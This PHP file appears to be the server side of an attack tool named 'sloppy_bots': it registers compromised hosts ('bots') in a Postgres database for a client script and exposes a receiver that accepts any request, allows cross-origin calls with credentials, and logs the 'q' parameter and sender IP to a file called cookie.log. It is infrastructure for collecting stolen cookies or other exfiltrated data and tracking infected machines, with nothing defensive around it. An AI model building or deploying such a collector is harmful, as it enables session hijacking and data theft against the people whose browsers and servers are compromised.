<?php
# Obviously this will change depending on what your database information is. but this will append new 'bots'
# to the db so you can reference them with the client script.
define('DBCONN', pg_connect("host=127.0.0.1 port=5432 user=sloppy_main dbname=sloppy_bots"));


function addNewHost($rhost, $uri, $action){
    if (!empty($rhost) && !empty($uri) && !empty($action)){
        if (strtolower($action) === 'add') {
            $prep = sprintf("INSERT INTO sloppy_bots(host, uri) VALUES ('%s', '%s')", pg_escape_string($rhost), pg_escape_string($uri));
            pg_exec(DBCONN, $prep);
        }else{
            http_response_code('444');
        }
    }
}

if (!empty($_SERVER["REQUEST_METHOD"])) {
    $outLog = './lots/cookie.log';
    echo "Diag information collected!";
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: ".$_SERVER["REMOTE_ADDR"]."\nContents: ".$req_dump."\n", FILE_APPEND);
            http_response_code(200);
        }
    }
}
